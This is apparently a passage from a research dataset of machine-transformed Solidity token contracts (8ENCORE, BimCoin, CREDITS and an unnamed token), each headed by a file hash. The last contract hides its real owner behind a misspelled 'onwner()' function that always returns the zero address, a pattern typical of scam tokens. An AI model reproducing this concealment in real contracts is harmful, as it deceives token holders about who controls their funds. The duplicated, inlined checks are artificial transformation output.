        _;
    }

    function pause() public onlyOwner whenNotPaused returns (bool) {
        if (!(msg.sender == owner)) {
            revert();
        }
        if (!(false == paused)) {
            revert();
        }
        paused = true;
        emit Pause();
        return true;
    }

    function unpause() public onlyOwner whenPaused returns (bool) {
        if (!(msg.sender == owner)) {
            revert();
        }
        if (!(true == paused)) {
            revert();
        }
        paused = false;
        emit Unpause();
        return true;
    }
}

contract BaseToken is Pausable {
    event AutoGenerated_mapping_BaseToken(string mapping_origin, string mapping_cache);
    using SafeMath for uint256;
    using SafeMath for uint256;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) approvals;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event TransferFrom(address indexed approval, address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint value);

    function BaseToken(string tokenName, string tokenSymbol) public {
        decimals = 18;
        name = tokenName;
        symbol = tokenSymbol;
    }

    function _transfer(address _from, address _to, uint _value) internal {
        if (!(_to != address(0x0))) {
            revert();
        }
        if (!(balanceOf[_from] >= _value)) {
            revert();
        }
        if (!(balanceOf[_to] + _value > balanceOf[_to])) {
            revert();
        }
        balanceOf[_from] = balanceOf[_from].sub(_value);
        balanceOf[_to] = balanceOf[_to].add(_value);
        emit Transfer(_from, _to, _value);
    }

    function transfer(address _to, uint256 _value) public whenNotPaused {
        if (!(false == paused)) {
            revert();
        }
        {
            if (!(_to != address(0x0))) {
                revert();
            }
            if (!(balanceOf[msg.sender] >= _value)) {
                revert();
            }
            if (!(balanceOf[_to] + _value > balanceOf[_to])) {
                revert();
            }
            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);
            balanceOf[_to] = balanceOf[_to].add(_value);
            emit Transfer(msg.sender, _to, _value);
        }
    }

    function transferFrom(address _from, address _to, uint _value) public whenNotPaused returns (bool) {
        if (!(false == paused)) {
            revert();
        }
        if (!(balanceOf[_from] >= _value)) {
            revert();
        }
        if (!(approvals[_from][msg.sender] >= _value)) {
            revert();
        }
        approvals[_from][msg.sender] = approvals[_from][msg.sender].sub(_value);
        {
            if (!(_to != address(0x0))) {
                revert();
            }
            if (!(balanceOf[_from] >= _value)) {
                revert();
            }
            if (!(balanceOf[_to] + _value > balanceOf[_to])) {
                revert();
            }
            balanceOf[_from] = balanceOf[_from].sub(_value);
            balanceOf[_to] = balanceOf[_to].add(_value);
            emit Transfer(_from, _to, _value);
        }

        emit TransferFrom(msg.sender, _from, _to, _value);
        return true;
    }

    function allowance(address src, address guy) public view returns (uint256) {
        return approvals[src][guy];
    }

    function approve(address guy, uint256 _value) public returns (bool) {
        approvals[msg.sender][guy] = _value;
        emit Approval(msg.sender, guy, _value);
        return true;
    }
}

contract AdvanceToken is BaseToken {
    event AutoGenerated_mapping_AdvanceToken(string mapping_origin, string mapping_cache);
    using SafeMath for uint256;
    string tokenName = "8ENCORE";
    string tokenSymbol = "8EN";
    struct frozenStruct {
        uint startTime;
        uint endTime;
    }
    mapping(address => bool) public frozenAccount;
    mapping(address => frozenStruct) public frozenTime;
    frozenStruct public allFrozenTime;
    event AllFrozenFunds(uint startTime, uint endTime);
    event FrozenFunds(address target, bool frozen, uint startTime, uint endTime);
    event Burn(address indexed from, uint256 value);

    function AdvanceToken() public BaseToken(tokenName, tokenSymbol) {
        allFrozenTime.startTime = 0;
        allFrozenTime.endTime = 0;
    }

    function _transfer(address _from, address _to, uint _value) internal {
        if (!(_to != address(0x0))) {
            revert();
        }
        if (!(balanceOf[_from] >= _value)) {
            revert();
        }
        if (!(balanceOf[_to] + _value > balanceOf[_to])) {
            revert();
        }
        bool AdvanceToken_isSaleOwner_TMP_250_0_0;
        {
            {
                bool TMP_250_0_0_0 = false;
                {
                    if (msg.sender == owner || true == saleContract[msg.sender]) {
                        TMP_250_0_0_0 = true;
                        AdvanceToken_isSaleOwner_TMP_250_0_0 = true;
                    }
                    if ((!TMP_250_0_0_0)) {
                        AdvanceToken_isSaleOwner_TMP_250_0_0 = false;
                    }
                }
            }
        }
        if (false == AdvanceToken_isSaleOwner_TMP_250_0_0) {
            bool AdvanceToken_isAllFrozen_TMP_252_0_0;
            {
                {
                    bool TMP_252_0_0_0 = false;
                    bool TMP_252_1_0_0 = false;
                    {
                        if (0 == allFrozenTime.startTime && 0 == allFrozenTime.endTime) {
                            TMP_252_0_0_0 = true;
                            AdvanceToken_isAllFrozen_TMP_252_0_0 = true;
                        }
                        if (allFrozenTime.startTime <= now && now <= allFrozenTime.endTime) {
                            if ((!TMP_252_0_0_0)) {
                                TMP_252_1_0_0 = true;
                                AdvanceToken_isAllFrozen_TMP_252_0_0 = true;
                            }
                        }
                        if ((!TMP_252_0_0_0) && (!TMP_252_1_0_0)) {
                            AdvanceToken_isAllFrozen_TMP_252_0_0 = false;
                        }
                    }
                }
            }
            require(false == AdvanceToken_isAllFrozen_TMP_252_0_0);
        }
        bool AdvanceToken_isFrozen_TMP_255_0_0;
        {
            {
                bool TMP_255_0_0_0 = false;
                bool TMP_255_1_0_0 = false;
                {
                    if (false == frozenAccount[_from]) {
                        TMP_255_0_0_0 = true;
                        AdvanceToken_isFrozen_TMP_255_0_0 = false;
                    }
                    if (frozenTime[_from].startTime <= now && now <= frozenTime[_from].endTime) {
                        if ((!TMP_255_0_0_0)) {
                            TMP_255_1_0_0 = true;
                            AdvanceToken_isFrozen_TMP_255_0_0 = true;
                        }
                    }
                    if ((!TMP_255_0_0_0) && (!TMP_255_1_0_0)) {
                        AdvanceToken_isFrozen_TMP_255_0_0 = false;
                    }
                }
            }
        }
        if (!(false == AdvanceToken_isFrozen_TMP_255_0_0)) {
            revert();
        }
        bool AdvanceToken_isSaleOwner_TMP_259_1_0;
        {
            {
                bool TMP_259_0_1_0 = false;
                {
                    if (msg.sender == owner || true == saleContract[msg.sender]) {
                        TMP_259_0_1_0 = true;
                        AdvanceToken_isSaleOwner_TMP_259_1_0 = true;
                    }
                    if ((!TMP_259_0_1_0)) {
                        AdvanceToken_isSaleOwner_TMP_259_1_0 = false;
                    }
                }
            }
        }
        if (false == AdvanceToken_isSaleOwner_TMP_259_1_0) {
            bool AdvanceToken_isFrozen_TMP_261_1_0;
            {
                {
                    bool TMP_261_0_1_0 = false;
                    bool TMP_261_1_1_0 = false;
                    {
                        if (false == frozenAccount[_to]) {
                            TMP_261_0_1_0 = true;
                            AdvanceToken_isFrozen_TMP_261_1_0 = false;
                        }
                        if (frozenTime[_to].startTime <= now && now <= frozenTime[_to].endTime) {
                            if ((!TMP_261_0_1_0)) {
                                TMP_261_1_1_0 = true;
                                AdvanceToken_isFrozen_TMP_261_1_0 = true;
                            }
                        }
                        if ((!TMP_261_0_1_0) && (!TMP_261_1_1_0)) {
                            AdvanceToken_isFrozen_TMP_261_1_0 = false;
                        }
                    }
                }
            }
            require(false == AdvanceToken_isFrozen_TMP_261_1_0);
        }
        balanceOf[_from] = balanceOf[_from].sub(_value);
        balanceOf[_to] = balanceOf[_to].add(_value);
        emit Transfer(_from, _to, _value);
    }

    function mintToken(uint256 mintedAmount) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        uint256 mintSupply = mintedAmount.mul(10 ** uint256(decimals));
        balanceOf[msg.sender] = balanceOf[msg.sender].add(mintSupply);
        totalSupply = totalSupply.add(mintSupply);
        emit Transfer(0, this, mintSupply);
        emit Transfer(this, msg.sender, mintSupply);
    }

    function isAllFrozen() public view returns (bool success) {
        if (0 == allFrozenTime.startTime && 0 == allFrozenTime.endTime) {
            return true;
        }
        if (allFrozenTime.startTime <= now && now <= allFrozenTime.endTime) {
            return true;
        }
        return false;
    }

    function isFrozen(address target) public view returns (bool success) {
        if (false == frozenAccount[target]) {
            return false;
        }
        if (frozenTime[target].startTime <= now && now <= frozenTime[target].endTime) {
            return true;
        }
        return false;
    }

    function setAllFreeze(uint startTime, uint endTime) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        allFrozenTime.startTime = startTime;
        allFrozenTime.endTime = endTime;
        emit AllFrozenFunds(startTime, endTime);
    }

    function freezeAccount(address target, bool freeze, uint startTime, uint endTime) public onlySaleOwner {
        if (!(msg.sender == owner || true == saleContract[msg.sender])) {
            revert();
        }
        frozenAccount[target] = freeze;
        frozenTime[target].startTime = startTime;
        frozenTime[target].endTime = endTime;
        emit FrozenFunds(target, freeze, startTime, endTime);
    }

    function burn(uint256 _value) public onlyOwner returns (bool success) {
        if (!(msg.sender == owner)) {
            revert();
        }
        if (!(balanceOf[msg.sender] >= _value)) {
            revert();
        }
        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);
        totalSupply = totalSupply.sub(_value);
        emit Burn(msg.sender, _value);
        return true;
    }

    function burnFrom(address _from, uint256 _value) public onlyOwner returns (bool success) {
        if (!(msg.sender == owner)) {
            revert();
        }
        if (!(balanceOf[_from] >= _value)) {
            revert();
        }
        balanceOf[_from] = balanceOf[_from].sub(_value);
        totalSupply = totalSupply.sub(_value);
        emit Burn(_from, _value);
        return true;
    }
}

```

## RQ1_5ab05cf437b3

文件 `units/program.sol`；SHA256 `f9ee95d606ee137e8a0ef29b041d129accb3adb24e1927cb64012481796239f6`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.26;

contract FiatContract {
    event AutoGenerated_mapping_FiatContract(string mapping_origin, string mapping_cache);

    function USD(uint _id) constant returns (uint256);
}

contract owned {
    event AutoGenerated_mapping_owned(string mapping_origin, string mapping_cache);
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        if (!(msg.sender == owner)) {
            revert();
        }
        _;
    }

    function transferOwnership(address originNewOwner) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        owner = originNewOwner;
    }
}

interface tokenRecipient {
    event AutoGenerated_mapping_tokenRecipient(string mapping_origin, string mapping_cache);

    function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) external;
}

contract TokenERC20 {
    event AutoGenerated_mapping_TokenERC20(string mapping_origin, string mapping_cache);
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed from, uint256 value);

    constructor(uint256 initialSupply, string tokenName, string tokenSymbol) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);
        balanceOf[msg.sender] = totalSupply;
        name = tokenName;
        symbol = tokenSymbol;
    }

    function _transfer(address _from, address _to, uint _value) internal {
        if (!(_to != address(0x0))) {
            revert();
        }
        if (!(balanceOf[_from] >= _value)) {
            revert();
        }
        if (!(balanceOf[_to] + _value > balanceOf[_to])) {
            revert();
        }
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        if (!(balanceOf[_from] + balanceOf[_to] == previousBalances)) {
            revert();
        }
    }

    function transfer(address _to, uint256 _value) public {
        {
            if (!(_to != address(0x0))) {
                revert();
            }
            if (!(balanceOf[msg.sender] >= _value)) {
                revert();
            }
            if (!(balanceOf[_to] + _value > balanceOf[_to])) {
                revert();
            }
            uint TokenERC20__transfer_3_previousBalances_0_0 = balanceOf[msg.sender] + balanceOf[_to];
            balanceOf[msg.sender] -= _value;
            balanceOf[_to] += _value;
            emit Transfer(msg.sender, _to, _value);
            if (!(balanceOf[msg.sender] + balanceOf[_to] == TokenERC20__transfer_3_previousBalances_0_0)) {
                revert();
            }
        }
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        if (!(_value <= allowance[_from][msg.sender])) {
            revert();
        }
        allowance[_from][msg.sender] -= _value;
        {
            if (!(_to != address(0x0))) {
                revert();
            }
            if (!(balanceOf[_from] >= _value)) {
                revert();
            }
            if (!(balanceOf[_to] + _value > balanceOf[_to])) {
                revert();
            }
            uint TokenERC20__transfer_3_previousBalances_0_0 = balanceOf[_from] + balanceOf[_to];
            balanceOf[_from] -= _value;
            balanceOf[_to] += _value;
            emit Transfer(_from, _to, _value);
            if (!(balanceOf[_from] + balanceOf[_to] == TokenERC20__transfer_3_previousBalances_0_0)) {
                revert();
            }
        }

        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        bool TokenERC20_approve_TMP_33_0_0;
        {
            {
                allowance[msg.sender][_spender] = _value;
                TokenERC20_approve_TMP_33_0_0 = true;
            }
        }
        if (TokenERC20_approve_TMP_33_0_0) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }
}

contract BimCoinToken is owned, TokenERC20 {
    event AutoGenerated_mapping_BimCoinToken(string mapping_origin, string mapping_cache);
    FiatContract internal fiatService;
    uint256 public buyPrice;
    bool internal useFiatService;
    bool internal onSale;
    uint256 internal buyPriceInCent;
    uint256 internal etherPerCent;
    uint256 constant TOKENS_PER_DOLLAR = 100000;
    uint256 storageAmount;
    address store;
    mapping(address => bool) public frozenAccount;
    event FrozenFunds(address target, bool frozen);

    constructor(uint256 initialSupply, string tokenName, string tokenSymbol, bool _useFiatContract) public TokenERC20(initialSupply, tokenName, tokenSymbol) {
        fiatService = FiatContract(0x8055d0504666e2B6942BeB8D6014c964658Ca591);
        useFiatService = _useFiatContract;
        buyPriceInCent = 100;
        onSale = true;
        storageAmount = (2 * (initialSupply * 10 ** uint256(decimals))) / 10;
        store = msg.sender;
    }

    function _transfer(address _from, address _to, uint _value) internal {
        if (!(_to != address(0x0))) {
            revert();
        }
        if (!(balanceOf[_from] >= _value)) {
            revert();
        }
        if (!(balanceOf[_to] + _value >= balanceOf[_to])) {
            revert();
        }
        if (!(!frozenAccount[_from])) {
            revert();
        }
        if (!(!frozenAccount[_to])) {
            revert();
        }
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
    }

    function freezeAccount(address target, bool freeze) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        frozenAccount[target] = freeze;
        emit FrozenFunds(target, freeze);
    }

    function setPrice(uint256 newBuyPrice) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        buyPrice = newBuyPrice;
    }

    function setPriceInCents(uint256 newBuyPrice) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        buyPriceInCent = newBuyPrice;
    }

    function() public payable {
        {
            if (!(onSale)) {
                revert();
            }
            uint256 BimCoinToken_getPrice_TMP_169_0_1;
            {
                {
                    bool TMP_169_0_0_1 = false;
                    {
                        if (useFiatService) {
                            TMP_169_0_0_1 = true;
                            BimCoinToken_getPrice_TMP_169_0_1 = fiatService.USD(0) * buyPriceInCent;
                        } else {
                            if ((!TMP_169_0_0_1)) {
                                BimCoinToken_getPrice_TMP_169_0_1 = etherPerCent * buyPriceInCent;
                            }
                        }
                    }
                }
            }
            uint256 BimCoinToken_buy_0_price_0_0 = BimCoinToken_getPrice_TMP_169_0_1;
            uint BimCoinToken_buy_0_amount_0_0 = (msg.value * TOKENS_PER_DOLLAR * 10 ** uint256(decimals)) / BimCoinToken_buy_0_price_0_0;
            if (!(balanceOf[owner] - BimCoinToken_buy_0_amount_0_0 >= storageAmount)) {
                revert();
            }
            store.transfer(msg.value);
            {
                if (!(msg.sender != address(0x0))) {
                    revert();
                }
                if (!(balanceOf[owner] >= BimCoinToken_buy_0_amount_0_0)) {
                    revert();
                }
                if (!(balanceOf[msg.sender] + BimCoinToken_buy_0_amount_0_0 >= balanceOf[msg.sender])) {
                    revert();
                }
                if (!(!frozenAccount[owner])) {
                    revert();
                }
                if (!(!frozenAccount[msg.sender])) {
                    revert();
                }
                balanceOf[owner] -= BimCoinToken_buy_0_amount_0_0;
                balanceOf[msg.sender] += BimCoinToken_buy_0_amount_0_0;
                emit Transfer(owner, msg.sender, BimCoinToken_buy_0_amount_0_0);
            }
        }
    }

    function buy() public payable {
        if (!(onSale)) {
            revert();
        }
        uint256 BimCoinToken_getPrice_TMP_108_0_0;
        {
            {
                bool TMP_108_0_0_0 = false;
                {
                    if (useFiatService) {
                        TMP_108_0_0_0 = true;
                        BimCoinToken_getPrice_TMP_108_0_0 = fiatService.USD(0) * buyPriceInCent;
                    } else {
                        if ((!TMP_108_0_0_0)) {
                            BimCoinToken_getPrice_TMP_108_0_0 = etherPerCent * buyPriceInCent;
                        }
                    }
                }
            }
        }
        uint256 price = BimCoinToken_getPrice_TMP_108_0_0;
        uint amount = (msg.value * TOKENS_PER_DOLLAR * 10 ** uint256(decimals)) / price;
        if (!(balanceOf[owner] - amount >= storageAmount)) {
            revert();
        }
        store.transfer(msg.value);
        {
            if (!(msg.sender != address(0x0))) {
                revert();
            }
            if (!(balanceOf[owner] >= amount)) {
                revert();
            }
            if (!(balanceOf[msg.sender] + amount >= balanceOf[msg.sender])) {
                revert();
            }
            if (!(!frozenAccount[owner])) {
                revert();
            }
            if (!(!frozenAccount[msg.sender])) {
                revert();
            }
            balanceOf[owner] -= amount;
            balanceOf[msg.sender] += amount;
            emit Transfer(owner, msg.sender, amount);
        }
    }

    function getPrice() internal view returns (uint256) {
        if (useFiatService) {
            return fiatService.USD(0) * buyPriceInCent;
        } else {
            return etherPerCent * buyPriceInCent;
        }
    }

    function setUseService(bool status) external onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        useFiatService = status;
    }

    function setEtherCentPrice(uint256 _newValue) external onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        etherPerCent = (10 ** uint256(decimals)) / (_newValue);
    }

    function setStore(address _newValue) external onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        store = _newValue;
    }

    function toggleSale(bool _value) external onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        onSale = _value;
    }

    function withdraw() external onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        uint balance = address(this).balance;
        if (balance > 0) {
            store.transfer(balance);
        }
    }
}

```

## RQ1_33d48945207e

文件 `units/program.sol`；SHA256 `7a25b986f6471faa58f1df64b870117cd6ff562b6f59b43ab687f0e76c0b3d1e`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.19;

contract Ownable {
    event AutoGenerated_mapping_Ownable(string mapping_origin, string mapping_cache);
    address public owner;

    function Ownable() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        if (!(msg.sender == owner)) {
            revert();
        }
        _;
    }
}

contract CREDITS is Ownable {
    event AutoGenerated_mapping_CREDITS(string mapping_origin, string mapping_cache);
    string public name = "CREDITS";
    string public symbol = "CS";
    uint8 public decimals = 6;
    uint256 public totalSupply = 1000000000000000;
    uint public TotalHoldersAmount;
    bool public Frozen = true;
    bool public CanChange = true;
    address public Admin;
    address public AddressForReturn;
    address[] Accounts;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public AccountIsFrozen;
    mapping(address => bool) public AccountIsNotFrozen;
    mapping(address => bool) public AccountIsNotFrozenForReturn;
    mapping(address => uint) public AccountIsFrozenByDate;
    mapping(address => bool) public isHolder;
    mapping(address => bool) public isArrAccountIsFrozen;
    mapping(address => bool) public isArrAccountIsNotFrozen;
    mapping(address => bool) public isArrAccountIsNotFrozenForReturn;
    mapping(address => bool) public isArrAccountIsFrozenByDate;
    address[] public Arrholders;
    address[] public ArrAccountIsFrozen;
    address[] public ArrAccountIsNotFrozen;
    address[] public ArrAccountIsNotFrozenForReturn;
    address[] public ArrAccountIsFrozenByDate;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
    event Burn(address indexed from, uint256 value);
    modifier IsNotFrozen() {
        if (!(((!Frozen && AccountIsFrozen[msg.sender] != true) || ((Frozen) && AccountIsNotFrozen[msg.sender] == true)) && now > AccountIsFrozenByDate[msg.sender])) {
            revert();
        }
        _;
    }
    modifier isCanChange() {
        if (!((msg.sender == owner || msg.sender == Admin) && CanChange == true)) {
            revert();
        }
        _;
    }

    function CREDITS() public {
        balanceOf[msg.sender] = totalSupply;
        Arrholders[Arrholders.length++] = msg.sender;
        Admin = msg.sender;
    }

    function setAdmin(address _address) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        if (!(CanChange)) {
            revert();
        }
        Admin = _address;
    }

    function setFrozen(bool _Frozen) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        if (!(CanChange)) {
            revert();
        }
        Frozen = _Frozen;
    }

    function setCanChange(bool _canChange) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        if (!(CanChange)) {
            revert();
        }
        CanChange = _canChange;
    }

    function setAccountIsFrozen(address _address, bool _IsFrozen) public isCanChange {
        if (!((msg.sender == owner || msg.sender == Admin) && CanChange == true)) {
            revert();
        }
        AccountIsFrozen[_address] = _IsFrozen;
        if (isArrAccountIsFrozen[_address] != true) {
            ArrAccountIsFrozen[ArrAccountIsFrozen.length++] = _address;
            isArrAccountIsFrozen[_address] = true;
        }
    }

    function setAccountIsNotFrozen(address _address, bool _IsFrozen) public isCanChange {
        if (!((msg.sender == owner || msg.sender == Admin) && CanChange == true)) {
            revert();
        }
        AccountIsNotFrozen[_address] = _IsFrozen;
        if (isArrAccountIsNotFrozen[_address] != true) {
            ArrAccountIsNotFrozen[ArrAccountIsNotFrozen.length++] = _address;
            isArrAccountIsNotFrozen[_address] = true;
        }
    }

    function setAccountIsNotFrozenForReturn(address _address, bool _IsFrozen) public isCanChange {
        if (!((msg.sender == owner || msg.sender == Admin) && CanChange == true)) {
            revert();
        }
        AccountIsNotFrozenForReturn[_address] = _IsFrozen;
        if (isArrAccountIsNotFrozenForReturn[_address] != true) {
            ArrAccountIsNotFrozenForReturn[ArrAccountIsNotFrozenForReturn.length++] = _address;
            isArrAccountIsNotFrozenForReturn[_address] = true;
        }
    }

    function setAccountIsFrozenByDate(address _address, uint _Date) public isCanChange {
        if (!((msg.sender == owner || msg.sender == Admin) && CanChange == true)) {
            revert();
        }
        if (!(!isArrAccountIsFrozenByDate[_address])) {
            revert();
        }
        AccountIsFrozenByDate[_address] = _Date;
        ArrAccountIsFrozenByDate[ArrAccountIsFrozenByDate.length++] = _address;
        isArrAccountIsFrozenByDate[_address] = true;
    }

    function transfer(address _to, uint256 _value) public {
        if (!(((!Frozen && AccountIsFrozen[msg.sender] != true) || ((Frozen) && AccountIsNotFrozen[msg.sender] == true) || (AccountIsNotFrozenForReturn[msg.sender] == true && _to == AddressForReturn)) && now > AccountIsFrozenByDate[msg.sender])) {
            revert();
        }
        if (!(balanceOf[msg.sender] >= _value)) {
            revert();
        }
        if (!(balanceOf[_to] + _value >= balanceOf[_to])) {
            revert();
        }
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        Transfer(msg.sender, _to, _value);
        if (isHolder[_to] != true) {
            Arrholders[Arrholders.length++] = _to;
            isHolder[_to] = true;
        }
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public IsNotFrozen returns (bool success) {
        if (!(((!Frozen && AccountIsFrozen[msg.sender] != true) || ((Frozen) && AccountIsNotFrozen[msg.sender] == true)) && now > AccountIsFrozenByDate[msg.sender])) {
            revert();
        }
        if (!(((!Frozen && AccountIsFrozen[_from] != true) || ((Frozen) && AccountIsNotFrozen[_from] == true)) && now > AccountIsFrozenByDate[_from])) {
            revert();
        }
        if (!(balanceOf[_from] >= _value)) {
            revert();
        }
        if (!(balanceOf[_to] + _value >= balanceOf[_to])) {
            revert();
        }
        if (!(_value <= allowance[_from][msg.sender])) {
            revert();
        }
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        Transfer(_from, _to, _value);
        if (isHolder[_to] != true) {
            Arrholders[Arrholders.length++] = _to;
            isHolder[_to] = true;
        }
        return true;
    }

    function burn(uint256 _value) public IsNotFrozen returns (bool success) {
        if (!(((!Frozen && AccountIsFrozen[msg.sender] != true) || ((Frozen) && AccountIsNotFrozen[msg.sender] == true)) && now > AccountIsFrozenByDate[msg.sender])) {
            revert();
        }
        if (!(balanceOf[msg.sender] >= _value)) {
            revert();
        }
        balanceOf[msg.sender] -= _value;
        totalSupply -= _value;
        Burn(msg.sender, _value);
        return true;
    }

    function burnFrom(address _from, uint256 _value) public IsNotFrozen returns (bool success) {
        if (!(((!Frozen && AccountIsFrozen[msg.sender] != true) || ((Frozen) && AccountIsNotFrozen[msg.sender] == true)) && now > AccountIsFrozenByDate[msg.sender])) {
            revert();
        }
        if (!(((!Frozen && AccountIsFrozen[_from] != true) || ((Frozen) && AccountIsNotFrozen[_from] == true)) && now > AccountIsFrozenByDate[_from])) {
            revert();
        }
        if (!(balanceOf[_from] >= _value)) {
            revert();
        }
        if (!(_value <= allowance[_from][msg.sender])) {
            revert();
        }
        balanceOf[_from] -= _value;
        allowance[_from][msg.sender] -= _value;
        totalSupply -= _value;
        Burn(_from, _value);
        return true;
    }

    function GetHoldersCount() public view returns (uint _HoldersCount) {
        return (Arrholders.length - 1);
    }

    function GetAccountIsFrozenCount() public view returns (uint _Count) {
        return (ArrAccountIsFrozen.length);
    }

    function GetAccountIsNotFrozenForReturnCount() public view returns (uint _Count) {
        return (ArrAccountIsNotFrozenForReturn.length);
    }

    function GetAccountIsNotFrozenCount() public view returns (uint _Count) {
        return (ArrAccountIsNotFrozen.length);
    }

    function GetAccountIsFrozenByDateCount() public view returns (uint _Count) {
        return (ArrAccountIsFrozenByDate.length);
    }

    function SetAddressForReturn(address _address) public isCanChange returns (bool success) {
        if (!((msg.sender == owner || msg.sender == Admin) && CanChange == true)) {
            revert();
        }
        AddressForReturn = _address;
        return true;
    }

    function setSymbol(string _symbol) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        if (!(CanChange)) {
            revert();
        }
        symbol = _symbol;
    }

    function setName(string _name) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        if (!(CanChange)) {
            revert();
        }
        name = _name;
    }

    function() public payable {
        revert();
    }
}

```

## RQ1_65379f53b3ab

文件 `units/program.sol`；SHA256 `35e5b09abcfea913e9c0d26cdeb0ad965d18d00ddc906160e9c94a47f47794b7`；位置按UTF-8字节。

```solidity
pragma solidity ^0.8.0;

abstract contract Context {
    event AutoGenerated_mapping_Context(string mapping_origin, string mapping_cache);

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    event AutoGenerated_mapping_Ownable(string mapping_origin, string mapping_cache);

    address internal _onwner;

    event onwnershipTransferred(address indexed previousonwner, address indexed newonwner);
    constructor() {
        address Ownable__msgSender_TMP_0_0_0;
        {
            {
                Ownable__msgSender_TMP_0_0_0 = msg.sender;
            }
        }
        {
            address TMP_0_0_0 = Ownable__msgSender_TMP_0_0_0;
            address Ownable__transferonwnership_1_oldonwner_0_0 = _onwner;
            _onwner = TMP_0_0_0;
            emit onwnershipTransferred(Ownable__transferonwnership_1_oldonwner_0_0, TMP_0_0_0);
        }

    }
    function onwner() public view virtual returns (address) {
        return address(0x0);
    }
    modifier onlyonwner() {
        if (!(_onwner == _msgSender())) {
            revert();
        }
        _;
    }
    function renounceonwnership() public virtual onlyonwner {
        address Ownable__msgSender_TMP_3_0_0;
        {
            {
                Ownable__msgSender_TMP_3_0_0 = msg.sender;
            }
        }
        if (!(_onwner == Ownable__msgSender_TMP_3_0_0)) {
            revert();
        }
        {
            address TMP_7_0_0 = address(0x0);
            address Ownable__transferonwnership_1_oldonwner_0_0 = _onwner;
            _onwner = TMP_7_0_0;
            emit onwnershipTransferred(Ownable__transferonwnership_1_oldonwner_0_0, TMP_7_0_0);
        }

    }

    function transferonwnership_transferonwnership(address newonwner) public virtual onlyonwner {
        address Ownable__msgSender_TMP_10_0_0;
        {
            {
                Ownable__msgSender_TMP_10_0_0 = msg.sender;
            }
        }
        if (!(_onwner == Ownable__msgSender_TMP_10_0_0)) {
            revert();
        }
        if (!(newonwner != address(0x0))) {
            revert();
        }
        {
            address Ownable__transferonwnership_1_oldonwner_0_0 = _onwner;
            _onwner = newonwner;
            emit onwnershipTransferred(Ownable__transferonwnership_1_oldonwner_0_0, newonwner);
        }

    }

    function _transferonwnership(address newonwner) internal virtual {
        address oldonwner = _onwner;
        _onwner = newonwner;
        emit onwnershipTransferred(oldonwner, newonwner);
    }
}

library SafeMath {
    event AutoGenerated_mapping_SafeMath(string mapping_origin, string mapping_cache);

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) {return (false, 0);}
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) {return (false, 0);}
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (a == 0) {return (true, 0);}
        uint256 c = a * b;
        if (c / a != b) {return (false, 0);}
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) {return (false, 0);}
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) {return (false, 0);}
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

